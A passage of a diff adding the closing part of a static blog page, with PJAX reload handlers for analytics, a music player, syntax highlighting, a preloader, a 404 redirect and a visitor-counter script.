+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
